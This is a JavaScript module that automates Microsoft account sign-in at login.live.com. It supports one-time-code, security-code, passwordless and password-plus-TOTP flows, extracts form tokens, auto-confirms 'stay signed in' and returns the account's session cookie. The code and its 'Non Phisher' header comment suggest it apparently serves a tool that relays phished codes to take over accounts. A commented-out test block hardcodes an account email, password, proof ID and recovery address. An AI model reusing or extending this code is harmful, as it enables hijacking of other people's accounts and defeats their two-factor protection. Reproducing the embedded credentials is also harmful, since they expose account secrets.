const getLiveData = require("./getLiveData")
const axios = require("axios");
const getCredentials = require("../info/getCredentials");
const { getEmailDescription } = require("../utils/getEmailDescription");
const sendott = require('./sendott');

module.exports = async function login(obj, creds) {
    /*
    Login
    - OTP
    - OTP Non Phisher (security code)
    - Non-Password OTP
    - Auth
    - Password & Secretkey
    */

    let host = null;
    let passwordhost = null;
    let mspok = null;
    let oparams = null;
    let nopassword = false;

    let data = await getLiveData();

    if (!obj?.email) {
        console.log(`Missing email, how tf?`);
        return null;
    }

    if (!data) {
        console.log(`Failed to get live data`);
        return null;
    }

    if (!creds) {
        creds = await getCredentials(obj.email)
    }

    if (!creds) {
        console.log(`Failed to get credentials for ${obj.email}`);
        return null;
    }

    if (creds?.Credentials?.HasPassword === 0 || creds?.Credentials?.HasPassword === false) {
        nopassword = true;
    }
    console.log(`Nopassword: ${nopassword}`);

    const cookies = data.cookies.split(";").reduce((acc, cookie) => {
        const [name, ...valueParts] = cookie.trim().split("=");
        acc[name] = valueParts.join("=");
        return acc;
    }, {});

    const uaid = cookies["uaid"] || "";
    const mspRequ = cookies["MSPRequ"] || "";
    const mscc = cookies["MSCC"] || "";

    try {
        let loginData = null;

        if (obj.email && (obj.id || obj.secId) && (obj.code || obj.otp)) {
            const rawCode = obj.code || obj.otp;
            const cleanCode = rawCode ? String(rawCode).trim().replace(/[\s\-]/g, "") : "";
            const cleanId = String(obj.id || obj.secId || "").trim();

            if (nopassword) {
                console.log(`No password!`);
                loginData = await axios({
                    method: "POST",
                    url: "https://login.live.com/ppsecure/post.srf",
                    maxRedirects: 0,
                    validateStatus: (status) => status >= 200 && status < 500,
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Cookie: data.cookies,
                    },
                    data: `SentProofIDE=${encodeURIComponent(cleanId)}&ProofType=1&npotc=${encodeURIComponent(cleanCode)}&ps=3&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(data.ppft)}&PPSX=Pass&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&type=24&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=`,
                });
            } else {
                loginData = await axios({
                    method: "POST",
                    url: "https://login.live.com/ppsecure/post.srf",
                    maxRedirects: 0,
                    validateStatus: (status) => status >= 200 && status < 500,
                    headers: {
                        "Content-Type": "application/x-www-form-urlencoded",
                        Cookie: data.cookies,
                    },
                    data: `login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&type=27&SentProofIDE=${encodeURIComponent(cleanId)}&otc=${encodeURIComponent(cleanCode)}&PPFT=${encodeURIComponent(data.ppft)}`,
                });
            }

        } else if (obj.slk && obj.email) {
            loginData = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: data.cookies,
                },
                data: `login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&slk=${obj.slk}&psRNGCSLK=${obj.slk}&type=21&PPFT=${data.ppft}`,
            });

        } else if (obj.otp && obj.email && obj.pw) {
            const loginpassword = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Origin": "https://login.live.com",
                    Cookie: data.cookies,
                },
                data: `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${encodeURIComponent(data.ppft)}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(obj.pw)}`,
            });

            if (loginpassword.status < 200 || loginpassword.status >= 400) {
                console.log("loginpassword request failed with status:", loginpassword.status);
                return null;
            }

            let id = null;
            const regex = /(?<="data":")[^"]+(?=","type":10,"display":)/;
            const match = loginpassword.data.match(regex);

            if (match) {
                id = match[0];
            } else {
                try {
                    const serverDataMatch = loginpassword.data.match(/var\s+ServerData\s*=\s*({.*?});/s);
                    if (serverDataMatch) {
                        const serverData = JSON.parse(serverDataMatch[1]);
                        if (serverData.arrUserProofs) {
                            const totpProof = serverData.arrUserProofs.find(
                                proof => proof.type === 10
                            );
                            if (totpProof) {
                                id = totpProof.data;
                            } else {
                                console.log("[login] TOTP (type 10) not found. Available proof types:", 
                                    serverData.arrUserProofs.map(p => `type=${p.type}`).join(", "));
                            }
                        } else {
                            // Diagnose WHY arrUserProofs is missing
                            if (serverData.sErrTxt) {
                                console.log("[login] Microsoft error:", serverData.sErrTxt);
                            }
                            if (serverData.sErrorCode) {
                                console.log("[login] Error code:", serverData.sErrorCode);
                            }
                            if (loginpassword.data.includes("password") && loginpassword.data.includes("incorrect")) {
                                console.log("[login] Password appears to be incorrect!");
                            } else if (loginpassword.data.includes("locked") || loginpassword.data.includes("suspended")) {
                                console.log("[login] Account may be locked/suspended!");
                            } else {
                                console.log("[login] arrUserProofs not found - account may not have TOTP 2FA enabled or password is wrong");
                            }
                        }
                    } else {
                        console.log("[login] ServerData not found in response");
                        // Check if Microsoft returned an error page
                        if (loginpassword.data.includes("Your account or password is incorrect")) {
                            console.log("[login] Wrong password confirmed by Microsoft!");
                        }
                    }
                } catch (error) {
                    console.error("[login] Error extracting TOTP:", error);
                    return null;
                }
            }

            if (!id) {
                console.log("ID is null, returning 'tfa'");
                return "tfa";
            }

            // Extract PPFT token (secondppft) from the login response
            let secondppft = null;

            // Method 1: Parse ServerData JSON to get sFT directly (most reliable)
            try {
                const serverDataMatch = loginpassword.data.match(/var\s+ServerData\s*=\s*({.*?});/s);
                if (serverDataMatch) {
                    const serverData = JSON.parse(serverDataMatch[1]);
                    // sFT contains the raw PPFT value directly
                    if (serverData.sFT) {
                        secondppft = serverData.sFT;
                        console.log("[login] Got PPFT from ServerData.sFT");
                    }
                    // Fallback: extract value from sFTTag HTML input element
                    if (!secondppft && serverData.sFTTag) {
                        const ppftMatch = serverData.sFTTag.match(/value="([^"]*)"/);
                        if (ppftMatch) {
                            secondppft = ppftMatch[1];
                            console.log("[login] Got PPFT from ServerData.sFTTag");
                        }
                    }
                }
            } catch (error) {
                console.error("[login] Error parsing ServerData for PPFT:", error.message);
            }

            // Method 2: Extract PPFT from hidden input in HTML
            if (!secondppft) {
                const ppftMatch = loginpassword.data.match(/name="PPFT"[^>]*value="([^"]*)"/);
                if (ppftMatch) {
                    secondppft = ppftMatch[1];
                    console.log("[login] Got PPFT from HTML input");
                }
            }
            if (!secondppft) {
                const ppftMatch2 = loginpassword.data.match(/value="([^"]*)"[^>]*name="PPFT"/);
                if (ppftMatch2) {
                    secondppft = ppftMatch2[1];
                    console.log("[login] Got PPFT from HTML input (reversed)");
                }
            }

            if (!secondppft) {
                console.log("[login] FATAL: Could not extract PPFT from login response!");
                return null;
            }
            console.log("[login] PPFT length:", secondppft.length);

            if (loginpassword.headers["set-cookie"]) {
                loginpassword.headers["set-cookie"].forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    const value = values.join("=").split(";").shift();
                    if (name === "__Host-MSAAUTH") passwordhost = value;
                    if (name === "MSPOK") mspok = value;
                    if (name === "OParams") oparams = value;
                });
            }

            if (!passwordhost) {
                console.log("passwordhost is null after first request");
                return null;
            }

            loginData = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                maxRedirects: 0,
                validateStatus: (status) => status >= 200 && status < 400,
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
                    "Origin": "https://login.live.com",
                    Cookie: `__Host-MSAAUTH=${passwordhost}; uaid=${uaid}; MSPRequ=${mspRequ}; MSCC=${mscc}; MSPOK=${mspok}; oParams=${oparams}`,
                },
                data: `otc=${encodeURIComponent(obj.otp)}&AddTD=true&SentProofIDE=${encodeURIComponent(id)}&GeneralVerify=false&PPFT=${encodeURIComponent(secondppft)}&canary=&sacxt=1&hpgrequestid=&hideSmsInMfaProofs=false&type=19&login=${encodeURIComponent(obj.email)}`,
            });




            /// Second OTP Method (for no OTP sent)
            // TD: Fix
        } else if (obj.email && (obj.password || obj.pw) && (obj.secId || obj.ssecid || obj.secid || obj.id) && (obj.secEmail || obj.ssecemail || obj.secemail)) {
            const password = obj.password || obj.pw;
            const secId = obj.secId || obj.ssecid || obj.secid || obj.id;
            const secEmail = obj.secEmail || obj.ssecemail || obj.secemail;
            console.log(`[login] Processing secondary OTP login flow...`);
            const loginpassword = await axios({
                method: "POST",
                url: "https://login.live.com/ppsecure/post.srf",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded",
                    Cookie: data.cookies,
                },
                data: `ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT=${data.ppft}&PPSX=PassportRN&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=1&isSignupPost=0&isRecoveryAttemptPost=0&i13=0&login=${encodeURIComponent(obj.email)}&loginfmt=${encodeURIComponent(obj.email)}&type=11&LoginOptions=3&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd=${encodeURIComponent(password)}`,
            });

            const pattern = /sFTTag['"]:['"]([^'"]*)['"]/g;
            const tokens = [...loginpassword.data.matchAll(pattern)].map(match => match[1]);
            let secondppft = tokens.length > 0 ? tokens[0] : null;

            // Enhanced PPFT extraction with multiple fallback methods
            if (!secondppft) {
                try {
                    const serverDataMatch = loginpassword.data.match(/var ServerData = ({.*?});/s);
                    if (serverDataMatch) {
                        const serverData = JSON.parse(serverDataMatch[1]);
                        if (serverData.sFTTag) {
                            const ppftMatch = serverData.sFTTag.match(/value="([^"]*)"/);
                            if (ppftMatch) {
                                secondppft = ppftMatch[1];
                            }
                        }
                    }
                    if (!secondppft) {
                        const ppftRegex = /name="PPFT"[^>]*value="([^"]*)"/;
                        const ppftMatch = loginpassword.data.match(ppftRegex);
                        if (ppftMatch) {
                            secondppft = ppftMatch[1];
                        }
                    }
                    if (!secondppft) {
                        const ppftRegex2 = /value="([^"]*)"[^>]*name="PPFT"/;
                        const ppftMatch2 = loginpassword.data.match(ppftRegex2);
                        if (ppftMatch2) {
                            secondppft = ppftMatch2[1];
                        }
                    }
                    if (!secondppft) {
                        // Additional fallback for various sFT/sFTTag patterns
                        const sFTPatterns = [
                            /["']sFTTag["']\s*:\s*["']([^"']+)["']/g,
                            /["']sFT["']\s*:\s*["']([^"']+)["']/g,
                            /sFTTag=([^&\s]+)/g,
                            /sFT=([^&\s]+)/g,
                            /name=["']?sFTTag["']?[^>]*value=["']?([^"'\s>]+)["']?/g,
                            /name=["']?sFT["']?[^>]*value=["']?([^"'\s>]+)["']?/g
                        ];
                        for (const pattern of sFTPatterns) {
                            const match = loginpassword.data.match(pattern);
                            if (match && match[1]) {
                                secondppft = match[1];
                                break;
                            }
                        }
                    }
                } catch (error) {
                    console.error("Error extracting secondary PPFT:", error);
                }
            }

            if (loginpassword.headers["set-cookie"]) {
                loginpassword.headers["set-cookie"].forEach(cookie => {
                    const [name, ...values] = cookie.split("=");
                    const value = values.join("=").split(";").shift();
                    if (name === "__Host-MSAAUTH") passwordhost = value;
                    if (name === "MSPOK") mspok = value;
                    if (name === "OParams") oparams = value;
                });
            }

            if (loginpassword.status < 200 || loginpassword.status >= 400) {
                return null;
            }

            console.log(`[login] Password Host acquired: ${passwordhost ? 'Yes' : 'No'}`)

            await sendott(secId)

            const time = Date.now();
            console.log(`Getting otc...`)
            const otc = await getEmailDescription(time, secEmail, true)
            if (!otc) {
                return
            }

            console.log(`[login] Got security code: [VERIFIED]`)

            loginData = await axios.post(
                'https://login.live.com/ppsecure/post.srf?mkt=nl-NL&id=38936&contextid=6912F145433F46F1&opid=042E85CB81883750&bk=1751659710&uaid=bd6f79b0a2c840a98835e2e04d523524&pid=0&route=C518_BL2',
                `AddTD=true&SentProofIDE=${encodeURIComponent(secId)}&GeneralVerify=false&PPFT=${encodeURIComponent(secondppft)}&canary=&sacxt=0&hpgrequestid=&hideSmsInMfaProofs=false&type=18&login=${encodeURIComponent(obj.email)}&ProofConfirmation=${encodeURIComponent(secEmail)}&otc=${encodeURIComponent(otc)}`,
                {
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:140.0) Gecko/20100101 Firefox/140.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Content-Type': 'application/x-www-form-urlencoded',
                        'Origin': 'https://login.live.com',
                        'Cookie': `__Host-MSAAUTH=${passwordhost}; MSPOK=${mspok}; OParams=${oparams}`,
                    }
                }
            );

        } else {
            console.log('Invalid input for login.js');
            return null;
        }

        console.log("loginData status:", loginData?.status);
        console.log("loginData location:", loginData?.headers?.location);

        // Check if Microsoft returned an explicit error page
        const isError =
            loginData?.data &&
            (loginData.data.includes('id="error"') ||
             loginData.data.includes('id="c_error"') ||
             loginData.data.includes('alert-error') ||
             loginData.data.includes('sErrTxt') ||
             loginData.data.includes("That code didn't work") ||
             loginData.data.includes("The code you entered is not valid") ||
             loginData.data.includes("Enter your password"));

        if (isError) {
            let errorMsg = null;
            const sErrMatch = loginData.data.match(/"sErrTxt":"([^"]+)"/);
            if (sErrMatch && sErrMatch[1]) {
                errorMsg = sErrMatch[1];
            }
            const htmlErrMatch =
                loginData.data.match(/<div[^>]+id=["'](?:error|c_error)["'][^>]*>([^<]+)<\/div>/i) ||
                loginData.data.match(/<div[^>]+class=["'][^"']*alert-error[^"']*["'][^>]*>([^<]+)<\/div>/i);
            if (htmlErrMatch && htmlErrMatch[1]) {
                errorMsg = htmlErrMatch[1].trim();
            }
            console.log(`[login] Microsoft rejected authentication: ${errorMsg || 'Invalid verification code or login error'}`);
            return null;
        }

        let hostp = null;
        const extractCookies = (cookieList) => {
            if (!cookieList) return;
            const list = Array.isArray(cookieList) ? cookieList : [cookieList];
            list.forEach(cookie => {
                if (typeof cookie !== 'string') return;
                const [rawName, ...values] = cookie.split("=");
                const name = (rawName || '').trim();
                const val = values.join("=").split(";").shift().trim();
                if (name === "__Host-MSAAUTH") {
                    host = val;
                    console.log(`[login] Host cookie (__Host-MSAAUTH) acquired`);
                } else if (name === "__Host-MSAAUTHP") {
                    hostp = val;
                    console.log(`[login] Persistent cookie (__Host-MSAAUTHP) acquired`);
                } else if (name === "MSAAUTH" && !host) {
                    host = val;
                    console.log(`[login] Host cookie (MSAAUTH) acquired`);
                }
            });
            if (!host && hostp) {
                host = hostp;
                console.log(`[login] Using __Host-MSAAUTHP as fallback for host`);
            }
        };

        if (loginData?.headers?.["set-cookie"]) {
            extractCookies(loginData.headers["set-cookie"]);
        }

        // Handle KMSI ("Stay signed in?") prompt when returned as HTTP 200
        const isKmsi =
            loginData?.status === 200 &&
            loginData?.data &&
            (loginData.data.includes('kmsi') ||
             loginData.data.includes('Keep me signed in') ||
             loginData.data.includes('Stay signed in') ||
             loginData.data.includes('type=28') ||
             loginData.data.includes('fKMSIEnabled'));

        if (isKmsi) {
            let kmsiPPFT = null;
            const sftMatch = loginData.data.match(/var ServerData = ({.*?});/s);
            if (sftMatch) {
                try {
                    const sd = JSON.parse(sftMatch[1]);
                    kmsiPPFT = sd.sFT || sd.sFTTag?.match(/value="([^"]*)"/)?.[1];
                } catch (e) {}
            }
            if (!kmsiPPFT) {
                kmsiPPFT =
                    loginData.data.match(/name="PPFT"[^>]*value="([^"]*)"/)?.[1] ||
                    loginData.data.match(/value="([^"]*)"[^>]*name="PPFT"/)?.[1];
            }

            if (kmsiPPFT) {
                console.log("[login] KMSI prompt detected. Auto-submitting KMSI to finalize authenticated session...");
                const actionMatch = loginData.data.match(/action="([^"]*post\.srf[^"]*)"/i);
                const kmsiAction = actionMatch ? actionMatch[1] : "https://login.live.com/ppsecure/post.srf";

                let currentCookieStr = data.cookies || "";
                if (loginData?.headers?.["set-cookie"]) {
                    const newC = loginData.headers["set-cookie"].map(c => c.split(";")[0]).join("; ");
                    currentCookieStr = `${currentCookieStr}; ${newC}`;
                }

                try {
                    const kmsiRes = await axios({
                        method: "POST",
                        url: kmsiAction,
                        maxRedirects: 0,
                        validateStatus: (s) => s >= 200 && s < 400,
                        headers: {
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Cookie": currentCookieStr,
                            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                            "Referer": "https://login.live.com/login.srf"
                        },
                        data: `PPFT=${encodeURIComponent(kmsiPPFT)}&type=28&LoginOptions=3`
                    });

                    console.log(`[login] KMSI response status: ${kmsiRes?.status}, location: ${kmsiRes?.headers?.location}`);
                    if (kmsiRes?.headers?.["set-cookie"]) {
                        extractCookies(kmsiRes.headers["set-cookie"]);
                    }
                    loginData = kmsiRes;
                } catch (kmsiErr) {
                    console.error("[login] Error submitting KMSI:", kmsiErr.message);
                }
            }
        }

        // Handle self-submitting form (fmHF)
        if (loginData?.data && loginData.data.includes('name="fmHF"')) {
            const fmAction = loginData.data.match(/<form[^>]+name="fmHF"[^>]+action="([^"]+)"/i)?.[1];
            const fmT = loginData.data.match(/<input[^>]+name="t"[^>]+value="([^"]+)"/i)?.[1];
            if (fmAction && fmT) {
                console.log("[login] Submitting self-posting fmHF form to:", fmAction);
                let currentCookieStr = data.cookies || "";
                if (loginData?.headers?.["set-cookie"]) {
                    const newC = loginData.headers["set-cookie"].map(c => c.split(";")[0]).join("; ");
                    currentCookieStr = `${currentCookieStr}; ${newC}`;
                }
                try {
                    const fmRes = await axios.post(fmAction, `t=${encodeURIComponent(fmT)}`, {
                        headers: {
                            "Content-Type": "application/x-www-form-urlencoded",
                            "Cookie": currentCookieStr
                        },
                        maxRedirects: 0,
                        validateStatus: (s) => s >= 200 && s < 400
                    });
                    if (fmRes?.headers?.["set-cookie"]) {
                        extractCookies(fmRes.headers["set-cookie"]);
                    }
                    loginData = fmRes;
                } catch (fmErr) {
                    console.error("[login] Error submitting fmHF:", fmErr.message);
                }
            }
        }

        if (loginData && loginData.headers && loginData.headers["set-cookie"]) {
            extractCookies(loginData.headers["set-cookie"]);
        } else if (loginData && loginData.request && loginData.request.res && loginData.request.res.rawHeaders) {
            const raw = loginData.request.res.rawHeaders;
            for (let i = 0; i < raw.length; i += 2) {
                if (raw[i].toLowerCase() === 'set-cookie') {
                    extractCookies([raw[i + 1]]);
                }
            }
        }

        // Verify that authentication actually succeeded
        if (!host && loginData?.status === 200 && !loginData?.headers?.location) {
            console.log("[login] Login request completed with HTTP 200 without redirect and without host cookie. Not authenticated.");
            return null;
        }

        if (host && nopassword) {
            console.log(`Nopassword fix seemed to have worked!`)
        }

    } catch (error) {
        console.error("Error during login process:", error);
        return null;
    }

    return host || null;
};


// async function main() {
//     let obj = {};
//     obj.email = "bdkmevnniexgh9m7@outlook.com";
//     obj.pw = "sywn5srfpc0cg3nm";
//     obj.ssecid = "-DqLVN0Mk8FFP9odp3iCYh4PEHJrYKQ1RfIT2z3S*9O6CqD8vLnMmdxg2CBwrfEY*XJOq!OUyoTpAFtvnbS4dXwqqzSc7gCleoJaFfeAEdbOIj8JLOPyx5HjA6rekSYVPwT4xI!pTCjZI45m7wjutwo8frJTFqTSCSLd6ZwNBel4Awy*3U6ZS9qjxeHuqBHwmGPxBFTkQ8Ho1z5OB2B2v!t0KYO0RJizxTKMAd!op6GbvTBsw2ScxTVkENEgXq6Zv3A$$";
//     obj.ssecemail = "f6rcgfe33fcfwmal@oldward.lol";
//     let result = await module.exports(obj, null);
//     console.log(`Result: ${result}`);
// }
// main();